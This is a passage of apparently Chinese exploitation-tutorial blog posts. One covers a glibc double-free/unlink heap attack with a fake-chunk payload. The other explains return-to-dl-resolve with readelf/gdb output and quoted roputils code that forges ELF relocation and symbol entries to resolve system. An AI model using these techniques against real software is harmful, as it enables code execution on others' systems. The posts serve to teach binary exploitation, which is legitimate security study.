+        <h1 id="double-free-利用"><a href="#double-free-利用" class="headerlink" title="double free 利用"></a>double free 利用</h1><p>unlink漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure></p>
+<pre><code>这里在宏中传入参数FD，BK，P分别是指向后一个，
+前一个，还有当前的chunk。很经典的链表节点删除，
+溢出的话导致链表被改，所以有了保护。
+当前内存块的上一块内存中指向下一块内存指针和
+当前内存块的下一块内存块的指向上一块内存块的指针
+如果不是指向当前内存块的话，程序就会崩溃退出。
+</code></pre><h1 id="漏洞的原理"><a href="#漏洞的原理" class="headerlink" title="漏洞的原理"></a>漏洞的原理</h1><pre><code>要利用Double Free的漏洞。我们就要让系统进行unlink的操作，
+达到篡改指针的目的。但是一般的情况下，
+我们两次释放同一块内存会被操作系统给检测出来，
+怎么欺骗过操作系统才是最重要的。
+</code></pre><p>假设程序申请了两个堆块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;malloc(504)</span><br><span class="line">&gt;malloc(512)</span><br></pre></td></tr></table></figure></p>
+<pre><code>然后释放这2块内存。这样子我们就可以在距离
+第一个指针偏移量为0x200的地方有了一个野指针。
+我们留下了一个野指针p指向偏移为0x200的地方。
+然后我们需要做的就是伪造chunk。再free野指针p。
+首先是申请一块更大的内存，
+大小应该等于我们刚才申请的内存的总和。
+</code></pre><blockquote>
+<p>malloc(768)<br>    最好和刚才2块内存大小总和一样，如果不一样大也也可以，<br>    就是待会伪造第二快内存块的大小的时候，<br>    要让伪造的大小等于我们申请的chunk的大小，<br>    否则会无法绕过检查。会被系统检查出double free。</p>
+</blockquote>
+<p>然后这是我在第二次申请的内存中填入的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;0x0 + 0x1f9 + 0x0804bfc0 - 0xc + 0x0804bfc0 - 0x8 + &apos;a&apos;*(0x200-24) + 0x000001f8 + 0x108</span><br></pre></td></tr></table></figure>
+<pre><code>接着释放野指针，除法unlink可以绕过检查，让指针指向自己前面的地址。
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/rtd/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/rtd/">return to dl-resolve</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>我们都知道，ELF在执行时，许多函数的地址是lazy binding的，即在第一次调用时才会解析其地址并填充至.got.plt。对于具体这一解析过程是如何完成的，之前并不怎么了解，只知道是在.plt中完成。其实之前Tiger有告诉我有一个名为roputils的工具，利用的就是构造所需信息，直接解析得到system的地址进而ROP。但直到最近才去研究其代码，搞明白这一技术，即return to dl-resolve，具体是怎么回事。</p>
+<p>关于这一技术，在phrack的某一期有具体介绍。在此，我们首先以32位为例，阐述其基本原理；之后则会分析64位环境下这一技术的一些注意点。</p>
+<p>32位环境下return to dl-resolve<br>ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。其内容示例如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d bof32</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x614 contains 24 entries:</span><br><span class="line">Tag        Type                         Name/Value</span><br><span class="line">0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line">0x0000000c (INIT)                       0x80482b0</span><br><span class="line">0x0000000d (FINI)                       0x80484f4</span><br><span class="line">0x00000019 (INIT_ARRAY)                 0x8049608</span><br><span class="line">0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x0000001a (FINI_ARRAY)                 0x804960c</span><br><span class="line">0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x6ffffef5 (GNU_HASH)                   0x804818c</span><br><span class="line">0x00000005 (STRTAB)                     0x804820c</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481ac</span><br><span class="line">0x0000000a (STRSZ)                      80 (bytes) 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line">0x00000015 (DEBUG)                      0x0</span><br><span class="line">0x00000003 (PLTGOT)                     0x8049700</span><br><span class="line">0x00000002 (PLTRELSZ)                   32 (bytes)</span><br><span class="line">0x00000014 (PLTREL)                     REL</span><br><span class="line">0x00000017 (JMPREL)                     0x8048290</span><br><span class="line">0x00000011 (REL)                        0x8048288</span><br><span class="line">0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line">0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line">0x6ffffffe (VERNEED)                    0x8048268</span><br><span class="line">0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line">0x6ffffff0 (VERSYM)                     0x804825c</span><br><span class="line">0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></p>
+<p>其中的JMPREL segment，对应于.rel.plt section，是用来保存运行时重定位表的。它与.rel.dyn类似，只不过.rel.plt是用于函数重定位，.rel.dyn是用于变量重定位。具体地，其内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r bof32</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.dyn&apos; at offset 0x288 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">080496fc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.plt&apos; at offset 0x290 contains 4 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804970c  00000107 R_386_JUMP_SLOT   00000000   read</span><br><span class="line">08049710  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">08049714  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main</span><br><span class="line">08049718  00000407 R_386_JUMP_SLOT   00000000   write</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，.rel.plt里包含4个条目。事实上，之前.dynamic section中的PLTRELSZ即为.rel.plt的总大小，32 bytes；PLTREL则指明这些条目的类型为REL；RELENT指明了每个REL类型条目的大小，8 bytes。于是32/8=4即为条目个数。</p>
+<p>这些条目的类型是Elf32_Rel，其定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef uint32_t Elf32_Addr;</span><br><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Addr    r_offset;               /* Address */</span><br><span class="line">Elf32_Word    r_info;                 /* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)</span><br><span class="line">#define ELF32_R_TYPE(val) ((val) &amp; 0xff)</span><br></pre></td></tr></table></figure></p>
+<p>我们以.rel.plt第一条，即read的条目为例，对比调试器显示的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/2x 0x8048290</span><br><span class="line">0x8048290:      0x0804970c      0x00000107</span><br></pre></td></tr></table></figure></p>
+<p>显示的结果与之前$ readelf -r的结果是相符的。具体地，r_offset即为该函数在.got.plt中的地址:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br></pre></td></tr></table></figure></p>
+<p>而r_info则保存的是其类型和符号序号。根据宏的定义，可知对于此条目，其类型为ELF32_R_TYPE(r_info)=7，对应于R_386_JUMP_SLOT；其symbol index则为RLF32_R_SYM(r_info)=1。</p>
+<p>注意到之前$ readelf -r所得到的结果中，包含有Sym.Value和Sym. Name信息。而这些信息就是通过symbol index找到的。具体地，.dynamic section中的SYMTAB，即.dynsym section，保存的便是相关的符号信息。每一条symbol信息的大小在SYMENT中体现，为16 bytes。通过$ readelf -s来查看其内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s bof32</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.dynsym&apos; contains 6 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)</span><br><span class="line">     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)</span><br><span class="line">     5: 0804850c     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.symtab&apos; contains 74 entries:</span><br></pre></td></tr></table></figure></p>
+<p>(注意我们这里只看.dynsym，因为它是运行时所需的。诸如export/import的符号信息全在这里。而.symtab是编译时的符号信息，这部分在strip之后会被删除掉。)</p>
+<p>可以看到，之前所说的read函数的符号信息条目index确实为1。我们通过调试器来看看其实际内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/4x 0x80481ac+16</span><br><span class="line">0x80481bc:      0x0000001a      0x00000000      0x00000000      0x00000012</span><br></pre></td></tr></table></figure></p>
+<p>对比符号条目的定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Word    st_name;   /* Symbol name (string tbl index) */</span><br><span class="line">Elf32_Addr    st_value;  /* Symbol value */</span><br><span class="line">Elf32_Word    st_size;   /* Symbol size */</span><br><span class="line">unsigned char st_info;   /* Symbol type and binding */</span><br><span class="line">unsigned char st_other;  /* Symbol visibility under glibc&gt;=2.2 */</span><br><span class="line">Elf32_Section st_shndx;  /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p>
+<p>其结果与$ readelf -r, $ readelf -s的结果相符。具体地，st_name保存的是该符号名称在STRTAB，即.dynstr中的地址：</p>
+<p>gdb-peda$ x/s 0x804820c+0x1a<br>0x8048226:      “read”<br>而对于其他项，如st_info，st_other等，我还没搞明白对应的意义。但在实际构造时，只需选择和其他相同的值应该即可。</p>
+<p>OK，以上便是相关背景知识。现在我们来看看在call read@plt时具体发生了什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br><span class="line">gdb-peda$ x/wx 0x804970c</span><br><span class="line">0x804970c &lt;read@got.plt&gt;:       0x080482f6</span><br><span class="line">gdb-peda$ x/2i 0x80482e0</span><br><span class="line">   0x80482e0:   push   DWORD PTR ds:0x8049704</span><br><span class="line">   0x80482e6:   jmp    DWORD PTR ds:0x8049708</span><br></pre></td></tr></table></figure></p>
+<p>在第一次调用时，jmp <a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>会跳回read@plt，这是我们已经知道的。接下来，会将参数push到栈上并跳至.got.plt+0x8，这相当于调用以下函数：</p>
+<p>_dl_runtime_resolve(link_map, rel_offset);<br>_dl_runtime_resolve则会完成具体的符号解析，填充结果，和调用的工作。具体地。根据rel_offset，找到重定位条目：</p>
+<p>Elf32_Rel * rel_entry = JMPREL + rel_offset;<br>根据rel_entry中的符号表条目编号，得到对应的符号信息：</p>
+<p>Elf32_Sym <em>sym_entry = SYMTAB[ELF32_R_SYM(rel_entry-&gt;r_info)];<br>再找到符号信息中的符号名称：<br>char </em>sym_name = STRTAB + sym_entry-&gt;st_name;<br>由此名称，搜索动态库。找到地址后，填充至.got.plt对应位置。最后调整栈，调用这一解析得到的函数。<br>于是，我们的思路是，提供一个很大的数作为rel_offset给_dl_runtime_resolve，使得找到rel_entry落在我们可控制的区域内。同理，构造伪条目，使得所对应的符号信息、符号的名称，均落在我们可控的区域内，那么就可以解析我们所需的函数地址并调用了。值得注意的是，在解析过程中，还会对ELF32_R_TYPE(rel_entry-&gt;r_info)等进行检查。但这些数据我们只需仿照正常的来构造即可，重点是对应的伪条目的index应计算正确。<br>作为实例，我们来看看roputils里是如何构造伪条目的。首先是函数dl_resolve_data。其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    def dl_resolve_data(self, base, name):</span><br><span class="line">jmprel = self.dynamic(&apos;JMPREL&apos;)</span><br><span class="line">relent = self.dynamic(&apos;RELENT&apos;)</span><br><span class="line">symtab = self.dynamic(&apos;SYMTAB&apos;)</span><br><span class="line">syment = self.dynamic(&apos;SYMENT&apos;)</span><br><span class="line">strtab = self.dynamic(&apos;STRTAB&apos;)</span><br><span class="line"></span><br><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)</span><br><span class="line">addr_symstr = addr_sym + syment</span><br><span class="line"></span><br><span class="line">r_info = (((addr_sym - symtab) / syment) &lt;&lt; 8) | 0x7</span><br><span class="line">st_name = addr_symstr - strtab</span><br><span class="line"></span><br><span class="line">buf = self.fill(padlen_reloc)</span><br><span class="line">buf += struct.pack(&apos;&lt;II&apos;, base, r_info)                      # Elf32_Rel</span><br><span class="line">buf += self.fill(padlen_sym)</span><br><span class="line">buf += struct.pack(&apos;&lt;IIII&apos;, st_name, 0, 0, 0x12)             # Elf32_Sym</span><br><span class="line">buf += self.string(name)</span><br><span class="line"></span><br><span class="line">return buf</span><br></pre></td></tr></table></figure></p>
+<p>从base开始便是用户可控的区域，也是用来构造伪Elf32_Rel, 伪Elf32_Sym，和符号名称的地方。具体的存放地址，还是根据数组条目的大小进行了对齐。而需要检查的地方，则全部硬编码了，只需计算这些伪条目对应在数组中的index填充即可。</p>
+<p>其次便是函数dl_resolve_call了。其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    def dl_resolve_call(self, base, *args):</span><br><span class="line">jmprel = self.dynamic(&apos;JMPREL&apos;)</span><br><span class="line">relent = self.dynamic(&apos;RELENT&apos;)</span><br><span class="line"></span><br><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">reloc_offset = addr_reloc - jmprel</span><br><span class="line"></span><br><span class="line">buf = self.p(self.plt())</span><br><span class="line">buf += self.p(reloc_offset)</span><br><span class="line">buf += self.p(self.gadget(&apos;pop&apos;, n=len(args)))</span><br><span class="line">buf += self.p(args)</span><br><span class="line"></span><br><span class="line">return buf</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，这里将所调用的函数的参数及返回的gadget放在栈上，再往上便是构造的伪Elf32_Rel条目的offset，最后则是.plt起始处的地址，在那里会完成将link_map放至栈上及调用_dl_runtime_resolve。</p>
+<p>64位环境下return to dl-resolve<br>相比32位，其实基本原理还是相同的。只是由于位数增加，一些结构体发生变化；此外，函数参数也变成由寄存器传递而非栈传递。</p>
+<p>具体地，我们看64位relocation entry的定义。首先通过$ readelf -d可知，现在的类型为RELA，大小RELAENT为24 bytes：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d bof64</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x7b0 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]</span><br><span class="line"> 0x000000000000000c (INIT)               0x4003e0</span><br><span class="line"> 0x000000000000000d (FINI)               0x400634</span><br><span class="line"> 0x0000000000000019 (INIT_ARRAY)         0x600798</span><br><span class="line"> 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000000000001a (FINI_ARRAY)         0x6007a0</span><br><span class="line"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000006ffffef5 (GNU_HASH)           0x400260</span><br><span class="line"> 0x0000000000000005 (STRTAB)             0x4002f8</span><br><span class="line"> 0x0000000000000006 (SYMTAB)             0x400280</span><br><span class="line"> 0x000000000000000a (STRSZ)              67 (bytes)</span><br><span class="line"> 0x000000000000000b (SYMENT)             24 (bytes)</span><br><span class="line"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class="line"> 0x0000000000000003 (PLTGOT)             0x600988</span><br><span class="line"> 0x0000000000000002 (PLTRELSZ)           96 (bytes)</span><br><span class="line"> 0x0000000000000014 (PLTREL)             RELA</span><br><span class="line"> 0x0000000000000017 (JMPREL)             0x400380</span><br><span class="line"> 0x0000000000000007 (RELA)               0x400368</span><br><span class="line"> 0x0000000000000008 (RELASZ)             24 (bytes)</span><br><span class="line"> 0x0000000000000009 (RELAENT)            24 (bytes)</span><br><span class="line"> 0x000000006ffffffe (VERNEED)            0x400348</span><br><span class="line"> 0x000000006fffffff (VERNEEDNUM)         1</span><br><span class="line"> 0x000000006ffffff0 (VERSYM)             0x40033c</span><br><span class="line"> 0x0000000000000000 (NULL)               0x0</span><br></pre></td></tr></table></figure></p>
+<p>其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef __u16   Elf64_Half;</span><br><span class="line">typedef __u32   Elf64_Word;</span><br><span class="line">typedef __u64   Elf64_Addr;</span><br><span class="line">typedef __u64   Elf64_Xword;</span><br><span class="line">typedef __s64   Elf64_Sxword;</span><br><span class="line"></span><br><span class="line">typedef struct elf64_rela &#123;</span><br><span class="line">Elf64_Addr r_offset;  /* Location at which to apply the action */</span><br><span class="line">Elf64_Xword r_info;   /* index and type of relocation */</span><br><span class="line">Elf64_Sxword r_addend;    /* Constant addend used to compute value */</span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line">#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span><br><span class="line">#define ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</span><br></pre></td></tr></table></figure></p>
+<p>相应地，在roputils中，64位下构造伪Elf64_Rela的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r_info = (((addr_sym - symtab) / syment) &lt;&lt; 32) | 0x7</span><br><span class="line"></span><br><span class="line">buf += struct.pack(&apos;&lt;QQQ&apos;, base, r_info, 0)                  # Elf64_Rela</span><br></pre></td></tr></table></figure>
+<p>SYMTAB中的条目定义则变化如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct elf64_sym &#123;</span><br><span class="line">Elf64_Word st_name;       /* Symbol name, index in string tbl */</span><br><span class="line">unsigned char st_info;    /* Type and binding attributes */</span><br><span class="line">unsigned char st_other;   /* No defined meaning, 0 */</span><br><span class="line">Elf64_Half st_shndx;      /* Associated section index */</span><br><span class="line">Elf64_Addr st_value;      /* Value of the symbol */</span><br><span class="line">Elf64_Xword st_size;      /* Associated symbol size */</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
+<p>可以看到，st_info，st_other等的位置被提前了。对应于roputils中的代码则为：</p>
+<pre><code>buf += struct.pack(&apos;&lt;IIQQ&apos;, st_name, 0x12, 0, 0)             # Elf64_Sym
+</code></pre><p>以上便是相关结构的变更情况。接下来，我们看roputils中传递函数参数的相关代码。</p>
+<p>首先，看看64位下.plt中解析函数地址的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x400420 &lt;read@plt&gt;: jmp    QWORD PTR [rip+0x200582]        # 0x6009a8 &lt;read@got.plt&gt;</span><br><span class="line">   0x400426 &lt;read@plt+6&gt;:       push   0x1</span><br><span class="line">   0x40042b &lt;read@plt+11&gt;:      jmp    0x400400</span><br><span class="line">gdb-peda$ x/2i 0x400400</span><br><span class="line">   0x400400:    push   QWORD PTR [rip+0x20058a]        # 0x600990</span><br><span class="line">   0x400406:    jmp    QWORD PTR [rip+0x20058c]        # 0x600998</span><br></pre></td></tr></table></figure>
+<p>可以看到，给_dl_runtime_resolve传递的参数仍然是两个，但第二个参数已由之前32位的相对JMPREL的偏移变为该条目的在数组中的index。相应地，roputils在这里也进行了改变：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)</span><br><span class="line">reloc_offset = (addr_reloc - jmprel) / relaent</span><br><span class="line"></span><br><span class="line">buf = self.p(self.plt())</span><br><span class="line">buf += self.p(reloc_offset)</span><br></pre></td></tr></table></figure>
+<p>另外，注意到给_dl_runtime_resolve传递参数的方式，依然是通过栈，而非一般情况下通过寄存器传递。这是因为此时的寄存器rdi等中已经存有要解析的函数所需的参数了。具体地，roputils中是通过某些gadget来将所需的参数，如/bin/sh的地址，保存在寄存器中。</p>
+<p>然而，阅读roputils的示例代码，我们发现它还会在解析函数地址之前，将link_map+0x1c8处设为NULL。我们试着去掉这一操作，再执行发现遇到segfault了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x40033c --&gt; 0x2000200020000</span><br><span class="line">RBX: 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">RCX: 0x155dc00000007</span><br><span class="line">RDX: 0x155dc</span><br><span class="line">RSI: 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">RDI: 0x4002f8 --&gt; 0x6f732e6362696c00 (&apos;&apos;)</span><br><span class="line">RBP: 0x0</span><br><span class="line">RSP: 0x600da8 --&gt; 0x0</span><br><span class="line">RIP: 0x7ffff7de9448 (&lt;_dl_fixup+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2])</span><br><span class="line">R8 : 0x600f00 --&gt; 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">R9 : 0x7ffff7dea4e0 (&lt;_dl_fini&gt;:        push   rbp)</span><br><span class="line">R10: 0x7ffff7ffe130 --&gt; 0x0</span><br><span class="line">R11: 0x246</span><br><span class="line">R12: 0x0</span><br><span class="line">R13: 0x0</span><br><span class="line">R14: 0x0</span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7de943b &lt;_dl_fixup+107&gt;:      test rax,rax</span><br><span class="line">   0x7ffff7de943e &lt;_dl_fixup+110&gt;:      je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x7ffff7de9444 &lt;_dl_fixup+116&gt;:      mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x7ffff7de9448 &lt;_dl_fixup+120&gt;:      movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x7ffff7de944c &lt;_dl_fixup+124&gt;:      and    eax,0x7fff</span><br><span class="line">   0x7ffff7de9451 &lt;_dl_fixup+129&gt;:      lea    rdx,[rax+rax*2]</span><br><span class="line">   0x7ffff7de9455 &lt;_dl_fixup+133&gt;:      mov    rax,QWORD PTR [r10+0x2e0]</span><br><span class="line">   0x7ffff7de945c &lt;_dl_fixup+140&gt;:      lea    r8,[rax+rdx*8]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x600da8 